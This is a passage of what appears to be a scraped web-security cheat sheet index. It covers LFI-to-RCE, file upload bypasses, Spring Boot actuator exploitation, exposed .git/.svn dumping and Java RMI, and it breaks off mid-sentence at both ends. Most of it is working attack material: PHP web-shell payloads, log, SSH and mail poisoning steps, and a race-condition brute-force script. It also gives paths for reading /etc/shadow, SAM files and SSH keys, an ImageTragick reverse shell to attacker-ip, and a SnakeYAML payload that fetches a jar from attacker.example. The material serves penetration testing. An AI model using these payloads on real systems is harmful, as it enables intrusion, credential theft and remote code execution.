$PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too) LFI to RCE via /proc/self/environ # Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file\nGET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1 User-Agent: \u0026lt;?=phpinfo(); ?\u0026gt; LFI to RCE via upload # If you can upload a file, just inject the shell payload in it (e.g : \u0026lt;?php system($_GET['c']); ?\u0026gt; ).\nhttp://example.com/index.php?page=path/to/uploaded/file.png In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf\nLFI to RCE via upload (race) # Worlds Quitest Let\u0026rsquo;s Play\u0026quot;\nUpload a file and trigger a self-inclusion. Repeat 1 a shitload of time to: increase our odds of winning the race increase our guessing odds Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6} Enjoy our shell. import itertools import requests import sys print(\u0026#39;[+] Trying to win the race\u0026#39;) f = {\u0026#39;file\u0026#39;: open(\u0026#39;shell.php\u0026#39;, \u0026#39;rb\u0026#39;)} for _ in range(4096 * 4096): requests.post(\u0026#39;http://target.com/index.php?c=index.php\u0026#39;, f) print(\u0026#39;[+] Bruteforcing the inclusion\u0026#39;) for fname in itertools.combinations(string.ascii_letters + string.digits, 6): url = \u0026#39;http://target.com/index.php?c=/tmp/php\u0026#39; + fname r = requests.get(url) if \u0026#39;load average\u0026#39; in r.text: # \u0026lt;?php echo system(\u0026#39;uptime\u0026#39;); print(\u0026#39;[+] We have got a shell: \u0026#39; + url) sys.exit(0) print(\u0026#39;[x] Something went wrong, please try again\u0026#39;) LFI to RCE via upload (FindFirstFile) # :warning: Only works on Windows\nFindFirstFile allows using masks (\u0026lt;\u0026lt; as * and \u0026gt; as ?) in LFI paths on Windows.\nUpload a file, it should be stored in the temp folder C:\\Windows\\Temp\\. Include it using http://site/vuln.php?inc=c:\\windows\\temp\\php\u0026lt;\u0026lt; LFI to RCE via phpinfo() # PHPinfo() displays the content of any variables such as $_GET, $_POST and $_FILES.\nBy making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.\nUse the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)\nResearch from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf\nLFI to RCE via controlled log file # Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.\nhttp://example.com/index.php?page=/var/log/apache/access.log http://example.com/index.php?page=/var/log/apache/error.log http://example.com/index.php?page=/var/log/apache2/access.log http://example.com/index.php?page=/var/log/apache2/error.log http://example.com/index.php?page=/var/log/nginx/access.log http://example.com/index.php?page=/var/log/nginx/error.log http://example.com/index.php?page=/var/log/vsftpd.log http://example.com/index.php?page=/var/log/sshd.log http://example.com/index.php?page=/var/log/mail http://example.com/index.php?page=/var/log/httpd/error_log http://example.com/index.php?page=/usr/local/apache/log/error_log http://example.com/index.php?page=/usr/local/apache2/log/error_log RCE via SSH # Try to ssh into the box with a PHP code as username \u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;]);?\u0026gt;.\nssh \u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;@10.10.10.10 Then include the SSH log files inside the Web Application.\nhttp://example.com/index.php?page=/var/log/auth.log\u0026amp;cmd=id RCE via Mail # First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.\nroot@kali:~# telnet 10.10.10.10. 25 Trying 10.10.10.10.... Connected to 10.10.10.10.. Escape character is \u0026#39;^]\u0026#39;. 220 straylight ESMTP Postfix (Debian/GNU) helo ok 250 straylight mail from: mail@example.com 250 2.1.0 Ok rcpt to: root 250 2.1.5 Ok data 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; subject: \u0026lt;?php echo system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt; data2 . In some cases you can also send the email with the mail command line.\nmail -s \u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#34; www-data@10.10.10.10. \u0026lt; /dev/null RCE via Apache logs # Poison the User-Agent in access logs:\n$ curl http://example.org/ -A \u0026#34;\u0026lt;?php system(\\$_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#34; Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.\nThen request the logs via the LFI and execute your command.\n$ curl http://example.org/test.php?page=/var/log/apache2/access.log\u0026amp;cmd=id LFI to RCE via PHP sessions # Check if the website use PHP Session (PHPSESSID)\nSet-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/ Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files\n/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27. user_ip|s:0:\u0026#34;\u0026#34;;loggedin|s:0:\u0026#34;\u0026#34;;lang|s:9:\u0026#34;en_us.php\u0026#34;;win_lin|s:0:\u0026#34;\u0026#34;;user|s:6:\u0026#34;admin\u0026#34;;pass|s:6:\u0026#34;admin\u0026#34;; Set the cookie to \u0026lt;?php system('cat /etc/passwd');?\u0026gt;\nlogin=1\u0026amp;user=\u0026lt;?php system(\u0026#34;cat /etc/passwd\u0026#34;);?\u0026gt;\u0026amp;pass=password\u0026amp;lang=en_us.php Use the LFI to include the PHP session file\nlogin=1\u0026amp;user=admin\u0026amp;pass=password\u0026amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27 LFI to RCE via credentials files # This method require high privileges inside the application in order to read the sensitive files.\nWindows version # First extract sam and system files.\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/sam http://example.com/index.php?page=../../../../../../WINDOWS/repair/system Then extract hashes from these files samdump2 SYSTEM SAM \u0026gt; hashes.txt, and crack them with hashcat/john or replay them using the Pass The Hash technique.\nLinux version # First extract /etc/shadow files.\nhttp://example.com/index.php?page=../../../../../../etc/shadow Then crack the hashes inside in order to login via SSH on the machine.\nAnother way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used /proc/self/status and /etc/passwd and try to access /\u0026lt;HOME\u0026gt;/.ssh/id_rsa.\nReferences # OWASP LFI HighOn.coffee LFI Cheat Turning LFI to RFI Is PHP vulnerable and under what conditions? Upgrade from LFI to RCE via PHP Sessions Local file inclusion tricks CVV #1: Local File Inclusion - SI9INT Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos Baby^H Master PHP 2017 by @orangetw Чтение файлов =\u0026gt; unserialize ! New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse It\u0026rsquo;s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018 Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction PHP LFI with Nginx Assistance PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18 LFI2RCE via PHP Filters - HackTricks Solving \u0026ldquo;includer\u0026rsquo;s revenge\u0026rdquo; from hxp ctf 2021 without controlling any files - @loknop "},{"id":47,"href":"/docs/http_parameter_pollution/","title":"HTTP Parameter Pollution","section":"Docs","content":" HTTP Parameter Pollution # Summary # HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate web logics or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name (?param1=value\u0026amp;param1=value). As there is no formal way of parsing HTTP parameters, individual web technologies have their own unique way of parsing and reading URL parameters with the same name. Some taking the first occurrence, some taking the last occurrence, and some reading it as an array. This behavior is abused by the attacker in order to bypass pattern-based security mechanisms.\nTools # No tools needed. Maybe Burp or OWASP ZAP.\nHow to test # HPP allows an attacker to bypass pattern based/black list proxies or Web Application Firewall detection mechanisms. This can be done with or without the knowledge of the web technology behind the proxy, and can be achieved through simple trial and error.\nExample scenario. WAF - Reads first param Origin Service - Reads second param. In this scenario, developer trusted WAF and did not implement sanity checks. Attacker -- http://example.com?search=Beth\u0026amp;search=\u0026#39; OR 1=1;## --\u0026gt; WAF (reads first \u0026#39;search\u0026#39; param, looks innocent. passes on) --\u0026gt; Origin Service (reads second \u0026#39;search\u0026#39; param, injection happens if no checks are done here.) Table of reference for which technology reads which parameter # When ?par1=a\u0026amp;par1=b\nTechnology Parsing Result outcome (par1=) ASP.NET/IIS All occurrences a,b ASP/IIS All occurrences a,b PHP/Apache Last occurrence b PHP/Zues Last occurrence b JSP,Servlet/Tomcat First occurrence a Perl CGI/Apache First occurrence a Python Flask First occurrence a Python Django Last occurrence b Nodejs All occurrences a,b Golang net/http - r.URL.Query().Get(\u0026quot;param\u0026quot;) First occurrence a Golang net/http - r.URL.Query()[\u0026quot;param\u0026quot;] All occurrences a,b IBM Lotus Domino First occurrence a IBM HTTP Server First occurrence a Perl CGI/Apache First occurrence a mod_wsgi (Python)/Apache First occurrence a Python/Zope All occurrences in array [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;] References # HTTP Parameter Pollution - Imperva HTTP Parameter Pollution in 11 minutes | Web Hacking - PwnFunction How to Detect HTTP Parameter Pollution Attacks - Acunetix "},{"id":48,"href":"/docs/insecure_deserialization/","title":"Insecure Deserialization","section":"Docs","content":" Insecure Deserialization # Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process \u0026ndash; taking data structured from some format, and rebuilding it into an object - OWASP\nCheck the following sub-sections, located in other files :\nJava deserialization : ysoserial, \u0026hellip; PHP (Object injection) : phpggc, \u0026hellip; Ruby : universal rce gadget, \u0026hellip; Python : pickle, \u0026hellip; YAML : PyYAML, \u0026hellip; References # Github - ysoserial Github - ysoserial.net Java-Deserialization-Cheat-Sheet - GrrrDog Understanding \u0026amp; practicing java deserialization exploits How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter Stöckli PHP Object Injection - OWASP PHP Object Injection - Thin Ba Shane PHP unserialize PHP Generic Gadget - ambionics security RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke Java Deserialization in manager.paypal.com by Michael Stepankin Instagram\u0026rsquo;s Million Dollar Bug by Wesley Wineberg Ruby Cookie Deserialization RCE on facebooksearch.algolia.com by Michiel Prins (michiel) Java deserialization by meals Diving into unserialize() - Sep 19- Vickie Li .NET Gadgets by Alvaro Muñoz (@pwntester) \u0026amp; OleksandrMirosh ExploitDB Introduction "},{"id":49,"href":"/docs/insecure_direct_object_references/","title":"Insecure Direct Object References","section":"Docs","content":" Insecure Direct Object References # Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. - OWASP\nTools # Burp Suite plugin Authz Burp Suite plugin AuthMatrix Burp Suite plugin Authorize Exploit # The value of a parameter is used directly to retrieve a database record.\nhttp://foo.bar/somepage?invoice=12345 The value of a parameter is used directly to perform an operation in the system\nhttp://foo.bar/changepassword?user=someuser The value of a parameter is used directly to retrieve a file system resource\nhttp://foo.bar/showImage?img=img00011 The value of a parameter is used directly to access application functionality\nhttp://foo.bar/accessPage?menuitem=12 Examples # HackerOne - IDOR to view User Order Information - meals HackerOne - IDOR on HackerOne Feedback Review - japz References # OWASP - Testing for Insecure Direct Object References (OTG-AUTHZ-004) OWASP - Insecure Direct Object Reference Prevention Cheat Sheet BUGCROWD - How-To: Find IDOR (Insecure Direct Object Reference) Vulnerabilities for large bounty rewards - Sam Houton IDOR tweet as any user by kedrisec Manipulation of ETH balance Viewing private Airbnb Messages Hunting Insecure Direct Object Reference Vulnerabilities for Fun and Profit (PART-1) - Mohammed Abdul Raheem - Feb 2, 2018 "},{"id":50,"href":"/docs/insecure_file_uploads/","title":"Insecure File Upload","section":"Docs","content":" Insecure File Upload # Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.\nTools # Fuxploider Burp \u0026gt; Upload Scanner ZAP \u0026gt; FileUpload AddOn Exploits # Defaults extensions # PHP Server .php .php3 .php4 .php5 .php7 # Less known PHP extensions .pht .phps .phar .phpt .pgif .phtml .phtm .inc ASP Server .asp .aspx .config .cer and .asa # (IIS \u0026lt;= 7.5) shell.aspx;1.jpg # (IIS \u0026lt; 7.0) shell.soap JSP : .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions Perl: .pl, .pm, .cgi, .lib Coldfusion: .cfm, .cfml, .cfc, .dbm Upload tricks # Use double extensions : .jpg.php, .png.php5 Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): .php.jpg Random uppercase and lowercase : .pHp, .pHP5, .PhAr Null byte (works well against pathinfo()) .php%00.gif .php\\x00.gif .php%00.png .php\\x00.png .php%00.jpg .php\\x00.jpg Special characters Multiple dots : file.php...... , in Windows when a file is created with dots at the end those will be removed. Whitespace and new line characters file.php%20 file.php%0d%0a.jpg file.php%0a Right to Left Override (RTLO): name.%E2%80%AEphp.jpg will became name.gpj.php. Slash: file.php/, file.php.\\, file.j\\sp, file.j/sp Multiple special characters: file.jsp/././././. Mime type, change Content-Type : application/x-php or Content-Type : application/octet-stream to Content-Type : image/gif Content-Type : image/gif Content-Type : image/png Content-Type : image/jpeg Content-Type wordlist: SecLists/content-type.txt Set the Content-Type twice: once for unallowed type and once for allowed. Magic Bytes Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application. PNG: \\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[ JPG: \\xff\\xd8\\xff GIF: GIF87a OR GIF8; Shell can also be added in the metadata Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character \u0026ldquo;:\u0026rdquo; will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. \u0026ldquo;file.asax:.jpg\u0026rdquo;). This file might be edited later using other techniques such as using its short filename. The \u0026ldquo;::$data\u0026rdquo; pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. \u0026ldquo;file.asp::$data.\u0026rdquo;) Filename vulnerabilities # Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.\nTime-Based SQLi Payloads: e.g. poc.js'(select*from(select(sleep(20)))a)+'.extension LFI/Path Traversal Payloads: e.g. image.png../../../../../../../etc/passwd XSS Payloads e.g. '\u0026quot;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;.extension File Traversal e.g. ../../../tmp/lol.png Command Injection e.g. ; sleep 10; Also you upload:\nHTML/SVG files to trigger an XSS EICAR file to check the presence of an antivirus Picture Compression # Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : curl 'http://localhost/test.php?0=system' --data \u0026quot;1='ls'\u0026quot;.\nPicture Metadata, hide the payload inside a comment tag in the metadata. Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating getimagesize() and imagecreatefromgif(). JPG: use createBulletproofJPG.py PNG: use createPNGwithPLTE.php GIF: use createGIFwithGlobalColorTable.php Picture with custom metadata # Create a custom picture and insert exif tag with exiftool. A list of multiple exif tags can be found at exiv2.org\nconvert -size 110x110 xc:white payload.jpg exiftool -Copyright=\u0026#34;PayloadsAllTheThings\u0026#34; -Artist=\u0026#34;Pentest\u0026#34; -ImageUniqueID=\u0026#34;Example\u0026#34; payload.jpg exiftool -Comment=\u0026#34;\u0026lt;?php echo \u0026#39;Command:\u0026#39;; if($_POST){system($_POST[\u0026#39;cmd\u0026#39;]);} __halt_compiler();\u0026#34; img.jpg Configuration Files # If you are trying to upload files to a :\nPHP server, take a look at the .htaccess trick to execute code. ASP server, take a look at the web.config trick to execute code. Configuration files examples\n.htaccess web.config httpd.conf __init__.py Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.\npackage.json \u0026#34;scripts\u0026#34;: { \u0026#34;prepare\u0026#34; : \u0026#34;/bin/touch /tmp/pwned.txt\u0026#34; } composer.json \u0026#34;scripts\u0026#34;: { \u0026#34;pre-command-run\u0026#34; : [ \u0026#34;/bin/touch /tmp/pwned.txt\u0026#34; ] } CVE - Image Tragik # Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)\npush graphic-context viewbox 0 0 640 480 fill \u0026#39;url(https://127.0.0.1/test.jpg\u0026#34;|bash -i \u0026gt;\u0026amp; /dev/tcp/attacker-ip/attacker-port 0\u0026gt;\u0026amp;1|touch \u0026#34;hello)\u0026#39; pop graphic-context More payload in the folder Picture Image Magik\nCVE - FFMpeg # FFmpeg HLS vulnerability\nZIP archive # When a ZIP/archive file is automatically decompressed after the upload\nZip Slip: directory traversal to write a file somewhere else python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15 ln -s ../../../index.php symindex.txt zip --symlinks test.zip symindex.txt Jetty RCE # Upload the XML file to $JETTY_BASE/webapps/\nJettyShell.xml - From Mikhail Klyuchnikov References # Bulletproof Jpegs Generator - Damien \u0026ldquo;virtualabs\u0026rdquo; Cauquil BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil La PNG qui se prenait pour du PHP, 23 février 2014 File Upload restrictions bypass - Haboob Team File Upload - Mahmoud M. Awali / @0xAwali IIS - SOAP Arbitrary File Upload Tricks In Java - pyn3rd File Upload - HackTricks Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019 A tip for getting RCE in Jetty apps with just one XML file! - Aug 4, 2022 - PT SWARM / @ptswarm Jetty Features for Hacking Web Apps - September 15, 2022 - Mikhail Klyuchnikov "},{"id":51,"href":"/docs/insecure_management_interfaces/","title":"Insecure Management Interface","section":"Docs","content":" Insecure management interface # Springboot-Actuator # Actuator endpoints let you monitor and interact with your application. Spring Boot includes a number of built-in endpoints and lets you add your own. For example, the /health endpoint provides basic application health information.\nSome of them contains sensitive info such as :\n/trace - Displays trace information (by default the last 100 HTTP requests with headers). /env - Displays the current environment properties (from Spring’s ConfigurableEnvironment). /heapdump - Builds and returns a heap dump from the JVM used by our application. /dump - Displays a dump of threads (including a stack trace). /logfile - Outputs the contents of the log file. /mappings - Shows all of the MVC controller mappings. These endpoints are enabled by default in Springboot 1.X. Note: Sensitive endpoints will require a username/password when they are accessed over HTTP.\nSince Springboot 2.X only /health and /info are enabled by default.\nRemote Code Execution via /env # Spring is able to load external configurations in the YAML format. The YAML config is parsed with the SnakeYAML library, which is susceptible to deserialization attacks. In other words, an attacker can gain remote code execution by loading a malicious config file.\nSteps # Generate a payload of SnakeYAML deserialization gadget. Build malicious jar git clone https://github.com/artsploit/yaml-payload.git cd yaml-payload # Edit the payload before executing the last commands (see below) javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . Edit src/artsploit/AwesomeScriptEngineFactory.java public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\u0026#34;ping rce.poc.attacker.example\u0026#34;); // COMMAND HERE } catch (IOException e) { e.printStackTrace(); } } Create a malicious yaml config (yaml-payload.yml) !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026#34;http://attacker.example/yaml-payload.jar\u0026#34;] ]] ] Host the malicious files on your server. yaml-payload.jar yaml-payload.yml Change spring.cloud.bootstrap.location to your server. POST /env HTTP/1.1 Host: victim.example:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 59 spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml Reload the configuration. POST /refresh HTTP/1.1 Host: victim.example:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 0 References # Springboot - Official Documentation Exploiting Spring Boot Actuators - Veracode "},{"id":52,"href":"/docs/insecure_source_code_management/","title":"Insecure Source Code Management","section":"Docs","content":" Insecure source code management # Git Example Recovering file contents from .git/logs/HEAD Recovering file contents from .git/index Tools Automatic recovery git-dumper.py diggit.py GoGitDumper rip-git GitHack GitTools Harvesting secrets trufflehog Yar Gitrob Gitleaks Subversion Example (Wordpress) Tools svn-extractor Bazaar Tools rip-bzr.pl bzr_dumper Mercurial Tools rip-hg.pl References Git # The following examples will create either a copy of the .git or a copy of the current commit.\nCheck for the following files, if they exist you can extract the .git folder.\n.git/config .git/HEAD .git/logs/HEAD Example # Recovering file contents from .git/logs/HEAD # Check for 403 Forbidden or directory listing to find the /.git/ directory Git saves all information in .git/logs/HEAD (try lowercase head too) 0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root \u0026lt;root@dfc2eabdf236.(none)\u0026gt; 1455532500 +0000 clone: from https://github.com/fermayo/hello-world-lamp.git 15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael \u0026lt;michael@easyctf.com\u0026gt; 1489390329 +0000 commit: Initial. 26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael \u0026lt;michael@easyctf.com\u0026gt; 1489390330 +0000 commit: Whoops! Remove flag. 6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael \u0026lt;michael@easyctf.com\u0026gt; 1489390332 +0000 commit: Prevent directory listing. Access the commit using the hash # create an empty .git repository git init test cd test/.git # download the file wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c # first byte for subdirectory, remaining bytes for filename mkdir .git/object/26 mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/ # display the file git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c tree 323240a3983045cdc0dec2e88c1358e7998f2e39 parent 15ca375e54f056a576905b41a417b413c57df6eb author Michael \u0026lt;michael@easyctf.com\u0026gt; 1489390329 +0000 committer Michael \u0026lt;michael@easyctf.com\u0026gt; 1489390329 +0000 Initial. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39 wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39 mkdir .git/object/32 mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/ git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39 040000 tree bd083286051cd869ee6485a3046b9935fbd127c0 css 100644 blob cb6139863967a752f3402b3975e97a84d152fd8f flag.txt 040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97 fonts 100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1 index.html 040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8 js Read the data (flag.txt) wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f mkdir .git/object/cb mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/ git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f Recovering file contents from .git/index # Use the git index file parser https://pypi.python.org/pypi/gin (python3).\npip3 install gin gin ~/git-repo/.git/index Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file.\n$ gin .git/index | egrep -e \u0026#34;name|sha1\u0026#34; name = AWS Amazon Bucket S3/README.md sha1 = 862a3e58d138d6809405aa062249487bee074b98 name = CRLF injection/README.md sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141 Tools # Automatic recovery # git-dumper.py # git clone https://github.com/arthaud/git-dumper pip install -r requirements.txt ./git-dumper.py http://web.site/.git ~/website diggit.py # git clone https://github.com/bl4de/security-tools/ \u0026amp;\u0026amp; cd security-tools/diggit ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True] ./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1 -u is remote path, where .git folder exists -t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder \u0026amp;\u0026amp; git init) -o is a hash of particular Git object to download GoGitDumper # go get github.com/c-sto/gogitdumper gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/ git log git checkout rip-git # git clone https://github.com/kost/dvcs-ripper perl rip-git.pl -v -u \u0026#34;http://web.site/.git/\u0026#34; git cat-file -p 07603070376d63d911f608120eb4b5489b507692 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2 parent 15ca375e54f056a576905b41a417b413c57df6eb author Michael \u0026lt;michael@easyctf.com\u0026gt; 1489389105 +0000 committer Michael \u0026lt;michael@easyctf.com\u0026gt; 1489389105 +0000 git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2 GitHack # git clone https://github.com/lijiejie/GitHack GitHack.py http://web.site/.git/ GitTools # git clone https://github.com/internetwache/GitTools ./gitdumper.sh http://target.tld/.git/ /tmp/destdir git checkout -- . Harvesting secrets # trufflehog # Searches through git repositories for high entropy strings and secrets, digging deep into commit history.\npip install truffleHog # https://github.com/dxa4481/truffleHog truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git Yar # Searches through users/organizations git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog.\ngo get github.com/nielsing/yar # https://github.com/nielsing/yar yar -o orgname --both Gitrob # Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.\ngo get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef gitrob [options] target [target2] ... [targetN] Gitleaks # Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.\n# Run gitleaks against a public repository docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git # Run gitleaks against a local repository already cloned into /tmp/ docker run --rm --name=gitleaks -v /tmp/:/code/ zricethezav/gitleaks -v --repo-path=/code/gitleaks # Run gitleaks against a specific Github Pull request docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000 or go get -u github.com/zricethezav/gitleaks Subversion # Example (Wordpress) # curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db INSERT INTO \u0026#34;NODES\u0026#34; VALUES(1,\u0026#39;trunk/test.txt\u0026#39;,0,\u0026#39;trunk\u0026#39;,1,\u0026#39;trunk/test.txt\u0026#39;,2,\u0026#39;normal\u0026#39;,NULL,NULL,\u0026#39;file\u0026#39;,X\u0026#39;2829\u0026#39;,NULL,\u0026#39;$sha1$945a60e68acc693fcb74abadb588aac1a9135f62\u0026#39;,NULL,2,1456056344886288,\u0026#39;bl4de\u0026#39;,38,1456056261000000,NULL,NULL); Download interesting files remove $sha1$ prefix add .svn-base postfix use first byte from hash as a subdirectory of the pristine/ directory (94 in this case) create complete path, which will be: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base Tools # svn-extractor # git clone https://github.com/anantshri/svn-extractor.git python svn-extractor.py –url \u0026#34;url with .svn available\u0026#34; Bazaar # Tools # rip-bzr.pl # wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u bzr_dumper # git clone https://github.com/SeahunOh/bzr_dumper python3 dumper.py -u \u0026#34;http://127.0.0.1:5000/\u0026#34; -o source Created a standalone tree (format: 2a) [!] Target : http://127.0.0.1:5000/ [+] Start. [+] GET repository/pack-names [+] GET README [+] GET checkout/dirstate [+] GET checkout/views [+] GET branch/branch.conf [+] GET branch/format [+] GET branch/last-revision [+] GET branch/tag [+] GET b\u0026#39;154411f0f33adc3ff8cfb3d34209cbd1\u0026#39; [*] Finish $ bzr revert N application.py N database.py N static/ Mercurial # Tools # rip-hg.pl # wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u References # bl4de, hidden_directories_leaks bl4de, diggit Gitrob: Now in Go - Michael Henriksen "},{"id":53,"href":"/docs/java_rmi/","title":"Java RMI","section":"Docs","content":" Java RMI # The attacker can host a MLet file and instruct the JMX service to load MBeans from the remote host.\nExploitation # Requirements # Jython The JMX server can connect to a http service that is controlled by the attacker JMX authentication is not enabled Detection # $ nmap -sV --script \u0026#34;rmi-dumpregistry or rmi-vuln-classloader\u0026#34; -p TARGET_PORT TARGET_IP -Pn -v 1089/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | rmi-dumpregistry: | jmxrmi | javax.management.remote.rmi.RMIServerImpl_Stub Remote Command Execution # The attack involves the following steps:\nStarting a web server that hosts the MLet and a JAR file with the malicious MBeans Creating a instance of the MBean javax.management.loading.MLet on the target server, using JMX Invoking the \u0026ldquo;getMBeansFromURL\u0026rdquo; method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file. The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX. The attacker finally 